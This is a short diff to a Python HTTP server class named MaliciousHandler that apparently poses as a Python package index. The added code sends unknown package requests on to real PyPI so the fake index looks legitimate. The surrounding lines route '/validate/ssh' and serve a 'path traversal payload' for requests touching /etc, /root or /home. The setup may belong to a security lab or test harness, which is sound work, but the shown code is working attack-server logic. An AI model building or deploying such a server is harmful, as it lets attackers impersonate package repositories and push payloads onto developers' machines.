@@ -135,8 +135,15 @@ class MaliciousHandler(http.server.BaseHTTPRequestHandler):
         elif '/validate/ssh' in path:
             self.validate_ssh()
         elif path.startswith('/simple/'):
-            # Unknown package - return empty page
-            self.send_html('<html><body></body></html>')
+            # Redirect other packages to real PyPI
+            pkg = path.replace('/simple/', '').strip('/')
+            if pkg:
+                self.send_response(302)
+                self.send_header('Location', f'https://pypi.org/simple/{pkg}/')
+                self.end_headers()
+                print(f"[SERVER] Redirecting {pkg} to PyPI")
+            else:
+                self.send_html('<html><body></body></html>')
         elif '%2F' in path or path.startswith('/etc') or path.startswith('/root') or path.startswith('/home'):
             # This is the path traversal payload delivery
             self.serve_payload()
